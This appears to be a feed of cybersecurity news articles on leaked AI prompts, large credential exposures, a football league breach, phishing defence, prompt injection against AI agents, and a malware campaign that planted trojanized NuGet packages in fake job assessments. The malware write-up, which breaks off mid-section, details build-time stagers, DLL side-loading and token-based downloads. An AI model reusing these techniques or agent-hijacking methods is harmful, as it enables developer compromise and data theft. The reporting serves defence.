In this article

Researchers traced stolen prompts to three AI hosting providers

Some stolen prompts were marked “zero data retention”

Keep sensitive data out of prompts and check which providers your AI routing service can send them to

Attackers have been reading queries sent indirectly to online AI services. They’ve scoured these queries (also known as “prompts”) for sensitive data, in some cases trying out stolen access keys within hours.

Not everyone works directly with the likes of ChatGPT, Gemini and Claude. Plenty of people use other AI services, including hosting companies that run open-source AI models.

There are also third-party services that accept your prompts and then send them on to the most appropriate AI services. These services, known as routers, give you access to different models. Perhaps you prefer one for designing something for your 3D printer and another for coding. On some marketplaces, the router sends your AI prompt to whichever provider offers the lowest price for the model you want. The advantage to you is that you only have to deal with one company but get access to lots of different AI services.

Many of these hosting providers and routing services will tell you that they don’t retain any of your data. In reality, things are far less secure than you might think. Security company Dragos tested several AI services from July to November, sending them nearly 2 million AI prompts in total.

Those prompts were littered with “canary tokens“—unique URLs and login credentials that wouldn’t be found anywhere else on the internet. If someone visited a URL or tried to use a credential, the researchers could trace it back to the prompt it came from. That’s exactly what happened.

Dragos Chief Research Officer HD Moore found “widespread failures to protect customer data” as prompts given to these routing services cropped up in different places online.

According to the Dragos blog, at least three hosting providers were robbed of their prompts, and none of them knew about it until the security company tipped them off. In the largest breach, attackers stole around 200 access keys for Amazon Web Services (AWS), Amazon’s cloud service. The keys belonged to the researchers, who had tied them to empty AWS accounts.

Dragos highlights three ways that canary tokens get leaked. In the first, attackers compromised the hosting provider that was running the AI service. These tokens were sometimes stolen even when the service provider rejected the prompt that contained them, the researchers added. That meant the attacker was stealing the keys at the initial access point, rather than delving into the internals of the AI service.

Even if a service did its best not to retain prompt data, that’s not much comfort if the prompts are stolen before it can discard them. Moore said:

“…some of the stolen requests were marked as ZDR [zero data retention]. A privacy flag doesn’t help when the attacker is already inside.”

The second technique saw attackers accessing prompts from routing services by advertising AI models at very low prices. That would cause the router to send them customer prompts. The attackers could then just turn on logging and see the prompts as they came through.

The problem here is that while prompts are encrypted in transit, they’re decrypted at every hop in the chain. Those hops are the different routing services, along with the hosting companies that run their services. Every time someone else sees your prompt, it’s another opportunity for it to be compromised.

Sometimes, the AI services that run the models extract secrets from the prompts that they are sent. One Chinese AI lab opened secret URLs from over half of the prompts that the researchers sent to its models. That included roughly two-thirds of requests marked “no data collection” or ZDR.

The lab also opened links from prompts sent to US hosting providers that were reselling its AI services. Someone who picked a US provider specifically to keep their data in the US could still have their prompt sent overseas.

Dragos didn’t name the Chinese lab in its blog post. But an email to customers from AI routing company OpenRouter published on X on November 21 said that unique test URLs sent to Chinese AI model provider MiniMax had been harvested.

On November 24, MiniMax acknowledged its security software had logged and opened URLs from prompts forwarded by OpenRouter and other providers. MiniMax said the software didn’t retain full conversations, and it has since disabled the process for the affected traffic and deleted the logged URLs.

OpenRouter said the research found no sign of a breach of its own systems. It removed 125 endpoints from ZDR eligibility, some as a precaution.

What you can do

What does all this mean to you as an AI user? If you’re talking directly to services like Claude, Gemini and ChatGPT, our usual advice applies. Be careful about what you tell them, especially if you’re pasting in something that contains passwords or personal information.

However, if you’re a company or an AI enthusiast using routing services or resellers for a better deal, or dealing with a hosting provider running an open-weight model, Dragos has some specific advice for you:

Host your own AI. Running your own AI locally keeps prompts on your own hardware, although a powerful model can require expensive equipment.

Go directly to the model provider. Going directly to the model provider means fewer companies handle your prompts. Check its privacy policy to see how it handles your data.

Choose who gets your prompts. If you’re going to use an AI routing service, hand-pick the providers you’ll let it send your prompts to.

Filter your secrets. Some providers can automatically filter out recognizable credentials, such as access keys, if you turn that setting on.

Use canary tokens yourself. Putting a unique test link or decoy credential into a prompt can alert you if someone uses it later.

Your name, address, and phone number may already be for sale.

Data brokers collect and sell your personal details to anyone willing to pay. Malwarebytes Personal Data Remover finds them and gets your information removed, then keeps watch so it stays that way.

Title: Database Leaks Expose 3.5 Billion Usernames, Passwords, and Documents
Context: However, as AI cybersecurity capabilities fuel faster vulnerability exploitation, more effective scamming, and ransomware attacks, access to personal data and account...
Full Text:
More than 3.5 billion usernames, passwords, national identity numbers, and documents were left exposed to anyone online in two unrelated databases, according to new findings shared with WIRED. The massive troves included data from people in dozens of countries. One seemed focused particularly on Chinese citizens and included more than a billion China-linked records.

The findings are the latest in a seemingly endless series of revelations about incidents in which inadequately secured data puts people’s personal information at risk. But the two examples also provide a window into the scale of current cybercriminal data collection—both information that attackers collect by assembling and organizing other datasets, and troves they amass using info-stealing malware.

“Personal data is personal data anywhere in the world. At this point, personal data for pretty much every American is out there somewhere, and if we look at China or elsewhere, they have the same kinds of problems and security risks,” says Greg Pollock, the director of research at security company UpGuard, who found one of the exposed databases. “The cybercriminal world is reaping the benefit of decades of bad information security practices.”

The two exposed databases are unconnected but were found at around the same time by two different researchers. Pollock’s discovery contains more than 1.5 billion aggregated documents and details of predominantly Chinese individuals and businesses. The second trove, found by Black Hills Information Security researcher Jeremiah Fowler, contains around 2 billion login credentials, with hundreds of millions linked to user accounts for mainstream United States tech platforms.

Exposed personal data, including usernames and passwords, has always been instrumental for scammers and cybercriminals. However, as AI cybersecurity capabilities fuel faster vulnerability exploitation, more effective scamming, and ransomware attacks, access to personal data and account credentials can be more important than ever to attackers.

The data discovered by Pollock includes 1.64 billion documents representing personal information from at least hundreds of millions—if not around a billion—people, most of them seemingly in China based on included national ID numbers. According to his analysis, the unsecured database held at least 840 million “distinct” national ID numbers, 300 million phone numbers, around 11 million student enrollment records, and nearly 8 million business registrations. From a sample of the data, both children and deceased individuals were included in the files, Pollock says.

The China-linked data sat unauthenticated and openly accessible on the open internet in what seemed to be some sort of cybercriminal or gray market infrastructure. Pollock was unable to trace an owner or find contact information to notify anyone about the exposure, but as he was investigating the leak, the database became inaccessible—seemingly as part of a ransomware attack or some sort of destructive campaign. He says the database was actively being updated until the week before he discovered it.

Title: LaLiga Says Football Fans’ Personal Data Stolen
Context: The data theft was stopped and the attacker blocked on November 16, with no other LaLiga systems impacted, the statement said
Full Text:
Spain’s top professional football league has revealed a data breach which resulted in the compromise of fans’ personally identifiable information (PII).

LaLiga said in a brief statement on November 23 that the incident impacted an unnamed fan services platform between November 14 and 16.

A cybercriminal gained unauthorized access and exfiltrated PII belonging to users who had registered with digital services provided by LaLiga and some clubs, it noted.

The data theft was stopped and the attacker blocked on November 16, with no other LaLiga systems impacted, the statement said. System monitoring has been stepped up and the incident reported to the Spanish Data Protection Agency (AEPD) and the National Police's Central Cybercrime Unit.

Read more on football-related cyber threats: Hackers Steal Transfer Fees, Cripple Football Stadiums

Muhammad Yahya Patel, vCISO EMEA at Huntress, argued that the sports sector in general has historically underinvested in cybersecurity relative to the value of what it holds.

“The Premier League introduced mandatory security standards this season specifically because the gap between the data sports organizations hold and the protection around it has become untenable,” he added. “LaLiga's breach reinforces that the problem isn't confined to English football. It's a sector-wide reckoning that European football's governing bodies need to treat with the same urgency the Premier League is now applying.”

Fans should be on the alert for potential follow-on scams using stolen personal data, Patel warned.

“Fraudsters use breach data to personalize their approaches,” he said. “A message that correctly references your team, your account, or your location feels more legitimate than a generic scam. That personalization is a warning sign, not a reassurance.”

Commenting on the data breach, Chris Dimitriadis, Chief Global Strategy Officer at ISACA noted that the incident highlights a fundamental challenge for the global digital economy and society.

“An organization’s cybersecurity is increasingly dependent on the resilience of the entire ecosystem in which it operates,” he said. “Investing in internal security is essential, but it is no longer sufficient. Organizations must extend their cybersecurity governance to shared platforms and third-party providers, establish coordinated incident response protocols and invest in professionals with the skills to anticipate emerging threats.”

LaLiga oversees Spain's two professional football divisions, representing 42 clubs. Beyond organizing competitions, it manages media rights, international expansion and technological initiatives across Spanish professional football.

In recent years, LaLiga has invested heavily in anti-piracy and digital protection technologies. Earlier in 2026, LaLiga partnered with Fastly to deploy AI-based systems for identifying and disrupting illegal sports streams which it estimated costs its clubs between $700-$800m (€600-€700m) each year.

Title: Researchers Find a New AI Attack Path: Agent Instructions
Context: It found that, while malicious code is still a major threat, tool poisoning and prompt injection are more prevalent in some ecosystems, making agent instructions a new attack path
Full Text:
Threat actors are finding new ways to hijack and manipulate AI agents into doing their bidding which don’t require malicious code, Ox Security has warned.

The security vendor analyzed 542,207 open source software components between July and October 2026 to compile its Plug and Pray report.

It found that, while malicious code is still a major threat, tool poisoning and prompt injection are more prevalent in some ecosystems, making agent instructions a new attack path.

“Companies are giving AI agents access to critical systems while relying on trust signals built for a different era,” said Neatsun Ziv, CEO of Ox Security. “Our research shows that the problem isn’t just what a tool can do. It’s who controls it, what code it actually runs, and what instructions it can give an AI agent. We need a new model for software trust.”

Read more on agentic threats: MCP Is Creating Major Governance Gaps, Researchers Warn

The researchers tracked suspicious components across four ecosystems: npm, PyPI, MCP servers, and agent skills.

They found that prompt injection and tool poisoning appeared in 22% of flagged MCP servers, while install- or import-time execution appeared in 16%.

In agent skills the gap was even wider: 26% and 0%. Additionally, over two-fifths (44%) contained instructions directing agents to send data out.

“The agent already has the permissions it needs. Attackers just have to convince it to use them,” said Moshe Siman Tov Bustan, research lead at Ox Security.

Three Questions for AI Agents

The report warned that traditional security approaches are ill-designed to spot such trickery. Teams have always made decisions on software based on who published it, what code it runs, and whether the code has been altered.

Yet in this new world, Ox Security found a source owner for only 70% of MCP servers (versus 93% of npm packages).

Furthermore, 67% ran on publisher-controlled infrastructure, which made it impossible to independently verify the deployed code. And 82% were malicious in their first observed version, meaning there was no clean version to compare against.

Organizations deploying AI agents must therefore go beyond checking whether dependencies contain vulnerable or malicious code, the report argued.

It suggested three questions security teams should find the answers to as part of their assessment:

Who controls the tools our agents connect to? Who is the publisher and where does the tool come from?

Can we verify the code those tools run? Does it match the publisher’s claims?

Will we know when that code changes? Can you see changes to a tool that runs on someone else’s infrastructure?

Title: The Next Cyberattack Won’t Wait. Are You Ready?
Context: On November 17, CISA urged organizations to patch a critical Oracle Java vulnerability
Full Text:
One day into the November Microsoft outage, Cofense Intelligence saw phishing emails posing as service notifications. The outage was real. The emails were designed to steal sign-in credentials. We published our findings on November 16. On November 17, CISA urged organizations to patch a critical Oracle Java vulnerability. Security teams should act on the patch guidance and keep email defenses running while they address it.

Read our November 16 Flash Alert · Read CISA’s November 17 alert

One campaign can look like many

The FBI has warned that criminals use generative AI to make scams more convincing and easier to scale. In polymorphic phishing, different versions of the same campaign can land in different inboxes. AI can help attackers produce more of those variants. Even modern filters can miss a message that’s been designed to evade AI algorithms.

For a security team, the work starts when the first report comes in. Removing that one message protects the person who reported it. Finding the other versions can protect employees who received a similar email and haven’t flagged it. That’s why teams need a way to investigate across inboxes.

Why AI alone isn’t enough

AI is essential to modern security. It processes volume and speed that no team could match by hand. But AI struggles with threats that don’t match previous patterns, and new lures are exactly what attackers are producing. Human analysts close that gap. They judge intent and context, and they respond to what automation hasn’t learned yet. Reports from employees and customers feed back into protection, so one organization’s report can help protect many others.

In one recent case, a brand-new lure got past several automated systems, including AI-based ones. Employees at a Cofense Phishing Defense Center customer reported the lure, in turn giving Cofense analysts the opportunity to protect all of our customers from this threat. Speed and human judgment working together made the difference. Cofense has seen a 22% growth from 2025 to 2026 so far in non-Microsoft related branding being used in phishing attacks as AI allows Threat Actors to expand upon the types of threats they are able to create. Depending on the industry, between 39% and 49% of phishing subject lines included the recipient’s name or other personal details. It is becoming increasingly easy for threat actors to use AI to harvest employee information and use it in phishing campaigns.

Find the campaign and remove it

Say one employee reports a fake service alert. Start with that email, then check whether other inboxes received related versions. AI helps group similar messages for analyst review. An analyst confirms which emails are malicious so the team can remove them, including copies nobody reported. That’s the difference between closing one report and removing the campaign.

See how Cofense Vision AI connects related messages

What organizations can do now

Walk through the steps below with the people who own email security, IT, and incident response. Start by checking who can remove a confirmed phish from multiple inboxes and how your team will coordinate if email is down.

Have Cyber Security solutions that are able to be flexible in the everchanging landscape of cybercrime and AI. You should have human resources working in tandem with supervised AI to ensure that you aren't left waiting for AI security models to catch up.

Map out alternative communication strategies for when you lose access to email or messaging platforms.

Have and verify backups for all important company data.

Ensure your internal Phishing Training programs are properly training your employees based on real life threats and targets weaknesses in your user base.

Document clear lines of communication. Employees should know who to contact when verifying a request or transaction. They should also know which backup channels to use if they suspect the original source has been compromised.

Don’t rely on a single layer of defense. No filter catches everything and attackers design campaigns to bypass them. Pair your automated security tools with detection and response to ensure that someone is finding what is slipping through.

Treat legitimate remote access tools with the utmost scrutiny. Attackers often abuse legitimate remote monitoring and remote management (RMM) tools, such as ConnectWise/ScreenConnect, because those tools blend in with normal IT activity. Block any RMM or remote access software your organization doesn't officially use and closely monitor the ones you do.

Patch with vetted updates. Apply tested patches for every known vulnerability. Prioritize anything actively exploited or facing the internet, like VPNs, firewalls, and remote access appliances.

Shrink your attack surface. Review and remove old or unused accounts, services, appliances, and applications. Anything you don't need is just one more way in.

Flag external email clearly. Use clear banners to warn users when a message comes from outside the organization. That simple visual cue helps users spot business email compromise (BEC) and impersonation attempts.

Title: Automation You Can Explain: Why AI-Driven Phishing Defense Needs Human Oversight
Context: Phishing attacks are increasingly sophisticated, with threat actors exploiting trusted platforms, legitimate services, and evolving techniques to bypass traditional security...
Full Text:
AI is transforming cybersecurity, enabling organizations to detect, analyze, and respond to threats faster than ever before. But as organizations increasingly rely on AI to make critical security decisions, an important question emerges: Who is ultimately accountable when AI takes action?

In its September 2026 report, Reduce AI Risk by Making Human “Guardians” Your Last Line of Defense, Gartner® examines the growing need for meaningful human oversight as AI becomes more deeply embedded in enterprise decision-making. Download the complete report here.

Gartner emphasizes that “real human oversight of AI outputs — not just ticking a compliance box or rubber-stamping decisions — is non-negotiable.”

This distinction is particularly important in phishing defense, where automated decisions can have immediate consequences for an organization's security and business operations.

At Cofense, we believe AI should empower security teams, not replace their judgment. The future of phishing defense isn't about choosing between human expertise and automation. It's about combining both to deliver faster, more accurate, and more accountable security outcomes.

Who Is Accountable When AI Acts Inside Your Inbox?

Phishing attacks are increasingly sophisticated, with threat actors exploiting trusted platforms, legitimate services, and evolving techniques to bypass traditional security controls. For security teams facing a constant influx of suspicious emails, AI-driven automation is essential to identifying and containing threats at scale.

But what happens when an automated system makes the wrong decision?

Consider an AI-powered security platform that identifies a suspicious email campaign and automatically quarantines messages across an organization. When the detection is accurate, the platform can prevent a potential compromise in seconds. But an incorrect classification could disrupt legitimate business communications, while a missed threat could expose employees to credential theft, malware, or business email compromise (BEC).

These scenarios and more, demonstrate why automation must be accompanied by clear accountability.

Gartner warns that “AI-driven workflows increase enterprise productivity but introduce significant risk, including biases, compliance gaps, and accountability voids.” As systems become more autonomous, organizations must be able to trace, explain, and challenge the decisions they make.

For phishing defense, we view that to mean knowing who is responsible for automated actions, understanding why a threat was flagged, and maintaining the ability to intervene when necessary.

AI can accelerate decision-making, but accountability must remain with the people responsible for protecting the organization.

Why Is Rubber-Stamping AI Not Real Oversight?

Only including a human in an automated workflow does not necessarily mean meaningful oversight is taking place.

If analysts are simply asked to approve AI-generated recommendations without understanding the reasoning behind them, their involvement becomes a formality rather than an effective security control.

Gartner addresses this challenge by calling for organizations to move from a traditional “human-in-the-loop” approach toward a “human-in-the-lead” model.

Under this model, human “decision stewards” take an active role in governing AI-driven decisions, with the authority to monitor, challenge, and override decisions when necessary. They recommend tailoring this oversight to the level of risk, applying stronger human controls to high-impact decisions while allowing lower-risk processes to operate with lighter supervision.

This approach is especially relevant to phishing defense.

Security analysts cannot manually investigate every suspicious email at the speed and scale required to combat modern attacks. AI can handle repetitive tasks, identify malicious patterns, and accelerate response times, while human expertise provides essential judgment when decisions become more complex.

The goal isn't to introduce unnecessary friction into every automated process. It's to ensure security professionals have the visibility and authority to intervene when it matters most.

Effective human oversight isn't about slowing AI down. It's about making automation more trustworthy.

What Does Real Human Oversight Look Like in Phishing Defense?

For organizations adopting AI-driven phishing defense, meaningful oversight should be embedded directly into the technology and its workflows.

Three capabilities are essential:

Human Authority Over Automated Actions Experts emphasize that decision stewards must have the authority to stop, pause, or question AI-driven decisions rather than simply approve them. In phishing defense, this means giving security teams control over how automation operates, including the ability to configure workflows, establish approval requirements, and intervene when necessary.

Explainable AI Decisions We see that Gartner highlights the importance of forensic accountability, including the ability to trace and explain AI-driven actions. For security teams, explainability means understanding why an email was classified as malicious and what indicators contributed to that detection. This context allows analysts to validate findings, investigate potential errors, and make informed response decisions rather than accepting AI-generated classifications at face value.

Complete Audit Trails According to Gartner, “Traceability makes enterprise governance transparent and defensible in the face of increasing regulatory demands.” Comprehensive audit trails document automated decisions, human interventions, and response actions, giving security teams the evidence needed to investigate incidents, evaluate performance, and demonstrate accountability to leadership and auditors. Together, these capabilities create a foundation for AI-driven phishing defense that balances operational efficiency with transparency and human control.

Why Does Human Oversight Matter Most in Regulated Industries?

For highly regulated industries such as financial services and healthcare, the consequences of poorly governed AI decisions can extend beyond operational disruption to regulatory exposure and reputational damage.

Organizations must be able to demonstrate that automated systems operate within established policies, maintain appropriate controls, and provide sufficient documentation for internal and regulatory review.

Yet many organizations are still developing the governance practices necessary to meet these expectations.

Gartner reports that only one in five organizations have highly effective AI governance practices and rank projects based specifically on an assessed AI risk-to-value ratio. The research also finds that just 49% of AI leaders conduct regular audits or risk assessments of AI systems recognizing that AI outputs cannot be blindly trusted.

As AI adoption expands, governance practices must evolve alongside it. This means evaluating more than detection accuracy and response speed. Security leaders must also consider whether their technology supports transparent decision-making, documented response actions, and appropriate human intervention.

Data governance is another critical consideration, particularly when security platforms process sensitive email content. Organizations need to understand where their data is stored, how it is processed, and whether automated workflows align with their compliance requirements.

Responsible AI adoption requires more than proving that automation works. Organizations must also be able to explain how it works and demonstrate that appropriate safeguards are in place.

What Three Questions Should You Ask Your AI Security Vendor?

We see that Gartner recommends establishing clear metrics to measure AI trust and performance, including decision quality, reversals, and operational impact. For organizations evaluating AI-driven phishing defense, three questions can help determine whether a platform delivers automation with meaningful accountability:

Who has the authority to approve or override automated actions? Can security teams configure approval workflows, establish appropriate levels of oversight, and intervene when AI-driven decisions require additional review?

Can we understand why AI flagged a particular threat? Does the platform provide sufficient context to explain its detections, allowing analysts to validate findings and investigate potential errors?

Can we demonstrate accountability for every automated decision?

Does the platform maintain comprehensive audit trails documenting detections, response actions, and human involvement?

These questions help organizations assess not only how much a platform can automate, but how effectively that automation can be governed.

How Cofense Combines Human Expertise with AI-Driven Automation

At Cofense, we believe the strongest phishing defense comes from combining the speed and scalability of AI with the experience and judgment of human security professionals.

Our AI-driven phishing defense platform is designed around this principle, helping organizations detect and respond to threats that bypass traditional security controls while maintaining visibility and control over automated actions.

This approach reflects the principles behind the Gartner “human-in-the-lead” model, where AI supports decision-making while people retain the authority to oversee outcomes.

Cofense delivers this through three foundational capabilities:

Human-Supervised Automation: Configurable, opt-in automation and analyst approval workflows allow security teams to maintain authority over response actions.

Explainable Detections: Visibility into why threats are flagged helps analysts evaluate AI-generated findings and make informed decisions.

Comprehensive Audit Trails: Detailed records of automated actions provide the transparency organizations need to support security governance and accountability.

By combining purpose-built AI, expert-validated threat intelligence, and human oversight, Cofense helps organizations improve operational efficiency without sacrificing control.

This approach delivers measurable results. Cofense's human-supervised AI achieves 99.998% accuracy with a 66% lower false positive rate, helping reduce unnecessary investigations while maintaining confidence in threat detection.

Cofense customers can also achieve 80–95% automation in phishing incident response, compared with an industry average of 20–30%, allowing analysts to focus on more complex threats and higher-value security activities.

Gartner recommends measuring the performance of combined human-AI operations against AI-only and human-only approaches. For phishing defense, this reinforces the importance of evaluating not just automation rates, but the accuracy, efficiency, and reliability of the outcomes those systems deliver.

The goal isn't simply to automate more. It's to automate effectively, with the right balance of AI-driven speed and human judgment.

The Future of Phishing Defense Is Human-Supervised

As AI becomes more autonomous, the need for meaningful human oversight will only grow. The Gartner research reinforces an important principle: Organizations must move beyond passive approval of AI-generated decisions and establish governance models that give people genuine authority over automated outcomes.

For cybersecurity leaders, this means looking beyond the speed of AI-driven detection and response to consider how confidently security teams can explain, validate, and control those actions.

At Cofense, we believe the best automation is automation you can explain.

By combining AI-driven detection, real-world threat intelligence, and human expertise, organizations can strengthen phishing defenses without sacrificing the transparency and accountability modern security operations demand.

Title: Orgs that leak data 'prioritize corporate interests over customers' says Have I Been Pwned’s Troy Hunt
Context: Troy Hunt, the founder of data breach reporting site Have I Been Pwned (HIBP), has revealed how organizations respond when he informs them they’ve leaked data – if they respond...
Full Text: Troy Hunt, the founder of data breach reporting site Have I Been Pwned (HIBP), has revealed how organizations respond when he informs them they’ve leaked data – if they respond at all. Hunt gave Anthropic’s Claude access to an email inbox containing over eight years of his email correspondence and then asked the AI to write a post summarising them, a method he said “was the best way to highlight the behaviors I keep seeing across many breaches and subsequent disclosure efforts.” Writing in person, Hunt described those behaviors as “standoffish behavior, deliberate delays, heavy involvement from lawyers, and a constant theme: prioritizing corporate interests over those of their customers.” Once Claude takes over writing duties, it opens with the observation that Hunt sent his standard notification email to 73 organizations between March 2018 and November 2026 and also used website contact forms. Claude/Hunt focuses on the breach notifications that don’t go well, for example when first contact “often goes nowhere” because “many organisations have no obvious way to report a security incident.” Some organizations Hunt contacted logged his notifications as customer support requests. “In one case, Troy received three automated surveys asking him to rate the support he'd received,” Claude wrote, before observing “A message that an organization’s customer data is being traded among criminals ended up in the same queue as a question about a late delivery.” Once someone at victim organization gets the message, a common response is to say they can find no evidence of the breach. Others try to play down the incident, saying it was only a website defacement or that Hunt is re-reporting a previous breach the victim has already disclosed. If an organization accepts Hunt is probably onto something, it typically says it needs to investigate the matter. Claude’s take on Hunt’s mails suggests he responds by pointing out that this is an irresponsible approach, because while the investigation takes place, “people whose data has been taken don't know they need to change a password or watch for phishing.” Next, victims send in the lawyers who ask if their employer or client is legally required to reveal the breach. Hunt typically replies by saying it is up to the victim to decide if the incident meets the threshold that triggers mandatory disclosure requirements under local laws, but that he intends to notify HIBP users regardless. Victims don’t like hearing that and respond in three ways: Calling to discuss disclosure, rather than committing to it; Asking to see the wording HIBP will use in its disclosure, a request that sees Hunt refer the victim to the HIBP site for examples of the thousand-plus breach reports already on the site; Arguing that disclosure, not the breach, is the real harm. Hunt/Claude suggests that each argument victims use to avoid disclosure “sounds reasonable on its own,” but argues “Together, they mean the people most affected by the breach are the last to hear about it.” The post also reports on some better interactions, such as a small booking platform that was initially skeptical about Hunt’s report, then admitted he was right and acted swiftly to inform customers. A European travel app hardened its systems, rotated its keys, and published a disclosure. “Troy held off loading the data so he could link to their statement, and thanked them for their transparency,” according to the Claude-generated text. The bot’s analysis also offers examples of when breach notifications go well. “Someone with authority over security answered quickly,” Claude concluded. “They treated Troy's data as help rather than as a threat. They told their customers what they knew, even when they didn't know everything yet, and updated the details later. None of them needed lawyers to manage the conversation.” Hunt appears to have asked Claude to offer its opinion of his email trove. “I don't think the main obstacle to disclosure is technical, or even legal,” the post states. “It's about incentives. For the organization, every day without a public statement is a day without bad headlines.” Hunt also said he won’t make a habit of having AI write his content, but said Claude “absolutely nails it!” Unlike many of the orgs Hunt contacted. ®

Title: The Cyber Threats Behind Space Race 2.0
Context: From the 2022 Viasat attack to hacktivists blinding Iran's tanker fleet, cyberattacks on ground stations, vendors, and terminals are a serious threat
Full Text:
The new space race isn't just rockets and lunar bases. From the 2022 Viasat attack to hacktivists blinding Iran's tanker fleet, cyberattacks on ground stations, vendors, and terminals are a serious threat. As Earth’s orbit fills with satellites and possibly even AI data centers, securing space matters as much as reaching it.

Background

There were 329 orbital launch attempts in 2025, up from 263 the year before. In the same year, a record 4,517 satellites were placed in orbit. 87% of these satellites were commercially owned; they are part of a space economy that reached $686 billion in 2025 and is set to skyrocket further.

In April 2026, Artemis II completed a crewed lunar flyby, the first humans beyond low Earth orbit since 1972. In March, NASA paused the Gateway station and pivoted to building a lunar base instead. Beijing expects taikonauts on the Moon's surface by 2030 and a functioning International Lunar Research Station by 2035.

The first space race ended with the Cold War, but now that geopolitical competition is escalating, the second space race has begun, and cybersecurity will play a vital role in the outcomes.

This is because thousands of new satellites are computers running software written by people. So is every lander, rover, and relay that follows them to the Moon. They also all have a connection to a ground station on Earth, which is connected to the internet. Therefore, as the second space race accelerates, the risk of cyberattacks affecting space operations is rising exponentially year after year.

Title: 13 Malicious NuGet Packages Target .NET Developers With Fake Job Assessments
Context: One git identity, Gabriel, made the first commit in all three fake axios repositories, and its GitHub account, gabsantosbus-star, released the wallet app (D)
Full Text:
Socket’s Threat Research Team identified 13 malicious NuGet packages from an operation that uses fake job “Home Assessment” projects to target Windows .NET developers. Most of the packages pose as WinUI 3 and WPF button controls. In the versions we analyzed, building or running a project that uses them downloads files from GitHub, stages a DLL side-loading pair around the Microsoft On-Screen Keyboard (osk.exe), or downloads and runs an executable. One package, WinUI.Button 1.0.0, remains listed on NuGet at the time of writing. NuGet has removed the other 12.

The operation began on npm in July 2026 and hosts its payloads on GitHub. Our analysis found:

A build-time stager. VS_Builder.MSBuildAnalyzer, later republished as HappyOne.MSBuildAnalyzer, ships an MSBuild targets file, build/VS_Builder.MsBuildAnalyzer.targets, that runs a bundled DLL after every build. In the version bundled with the lure, that DLL downloads a file from GitHub to %LOCALAPPDATA%\osk\OskSupport.dll and copies C:\Windows\System32\osk.exe next to it.

A runtime trigger. The FileButton control in the lure’s VS_Builder.WinUI3Controls package starts the copied osk.exe when the app first creates the control. osk.exe and osksupport.dll are a publicly documented DLL side-loading pair.

A downloader in a button control. Creating a WUIButton control from WinUI.Button starts a background task in lib/net8.0-windows10.0.19041/WinUI.Button.dll that downloads avast.exe through the GitHub API with an embedded access token, saves it as %TEMP%\Launcher.exe and runs it.

Executables disguised as project files. Two fake axios repositories serve Windows executables named lib/env/axios.csproj. Their commit history holds a loader that uses a GitHub repository, reached with an embedded token, as two-way command and control (C2), a Chrome profile stealer that uploads to GitHub, and a payload that reports to Telegram.

A trojanized wallet app. A “Crypto Wallet Analyzer” app released on GitHub on November 13 hides a new build of that loader in a bundled DLL.

Five Infection Paths, One Operation #

The diagram below shows five infection paths from one operation. These links tie them together:

A shared owner (A and C). stevenleedig-ux owns the assessment (A) and one of path C’s two fake axios repositories.

The npm packages and the ClickFix page (E). Six npm packages pull payloads from the other fake axios repository and from a third, whose owner figma-share hosts the ClickFix page (E).

A shared git identity (D). One git identity, Gabriel, made the first commit in all three fake axios repositories, and its GitHub account, gabsantosbus-star, released the wallet app (D).

A shared publisher. HappyOne, which republished the stager, published seven of the 13 packages in July and August.

Token ties (B). WinUI.Button (B) shares a White-Super owner name and a token-based GitHub download with path C. Web3TotalButton shares that naming and WinUI.Button’s description.

An owner, a git identity, two email addresses, a publisher and a naming pattern tie the five paths and the npm packages together.

A WinUI 3 Take-Home Test That Must Be Built on Windows #

The most recent lure we found is the public GitHub repository stevenleedig-ux/WinUI3_Home_Assessment, created on November 4, 2026. Its README presents “[Home Assessment] WinUI 3 - Mini File Vault & Tracker”, a three to four hour exercise built on a starter Visual Studio solution. Candidates are told that building the project shows the starter UI and that the work must be developed and tested on native Windows with Visual Studio 2026. We could not determine how the Home Assessment lures reach candidates; we found no recruiter message, email or job post for them, unlike the wallet app lure described below.

The README sets two tasks, styling the list entries by type and validating new paths, and both revolve around a list of file paths that the app renders with a button control supplied through NuGet, FileButton. The README instructs: “Do not alter the inner workings or styles of the external FileButton itself”. Candidates may only set its exposed properties (Background, HoverColor, TextCustomColor and CornerRadius). The rule steers candidates away from the control that carries the runtime trigger described below.

The lure’s task list tells candidates not to alter the external FileButton control.

The starter window pre-loads two sample entries, C:\Windows and the Windows hosts file, each rendered with controls:FileButton, so opening the main window creates the control.

Thirteen Packages Under Four NuGet Accounts #

The NuGet side of the operation ran from July 23 to November 4, 2026, across four accounts:

HappyOne: WinUI3IconButton, RevertButtonIcon, WindowsAccentColorName, SetButtonColor, InitializeCustomButton, StyledAppButton and StyledComponent (July and August), then HappyOne.MSBuildAnalyzer and HappyOne.WinUI3Controls (November 4).

Carol-White-Super: WinUI.Button (September 2).

Steven-White-Super: Web3TotalButton (October 25).

VS_Builder: VS_Builder.MSBuildAnalyzer and VS_Builder.WinUI3Controls (November 2).

These 13 IDs had 28 versions on NuGet. The controls target WinUI 3 with the Windows App SDK (WinUI.Button, Web3TotalButton, WinUI3IconButton and both WinUI3Controls packages) or WPF-style net8.0-windows7.0 (StyledAppButton and StyledComponent).

NuGet lists Web3TotalButton, VS_Builder.MSBuildAnalyzer and VS_Builder.WinUI3Controls as malware in its public removal log. Socket flags RevertButtonIcon, SetButtonColor and InitializeCustomButton as malware: the first two download a Windows executable to the user’s temp folder and run it, and InitializeCustomButton starts the copy that SetButtonColor drops. Five more are tied to the set by dependency or by the lure: WinUI3IconButton (from version 1.1.4), StyledAppButton and StyledComponent depend on other packages in the set, WindowsAccentColorName is a dependency of SetButtonColor and InitializeCustomButton, and HappyOne.WinUI3Controls is the FileButton package the lure switched to.

How the Assessment Infects a Candidate’s Machine #

A Package Feed Inside the Repository

The first commit, bfb103a (November 4, 12:41 UTC), adds a Packages folder holding VS_Builder.MSBuildAnalyzer.1.2.7.nupkg and VS_Builder.WinUI3Controls.1.0.7.nupkg, and sets RestoreAdditionalProjectSources so that NuGet restores from that folder. The second commit, d45e9f3, corrected the folder path. Neither version has a NuGet catalog entry or the repository signature that NuGet adds to every package it serves. The DLLs inside both packages are timestamped minutes before the first commit and about 36 hours after NuGet deleted the VS_Builder account’s packages.

The project file also sets DisableFastUpToDateCheck to true. According to Microsoft’s documentation, this makes Visual Studio bypass its own fast up-to-date check and use MSBuild to decide whether the project needs rebuilding. The reference to the analyzer package sets PrivateAssets to all and ExcludeAssets to runtime, which keeps its DLL out of the application while leaving its build logic active.

In the first lure commit, the project file adds a local package source and references both bundled packages.

An MSBuild Target That Runs After Every Build

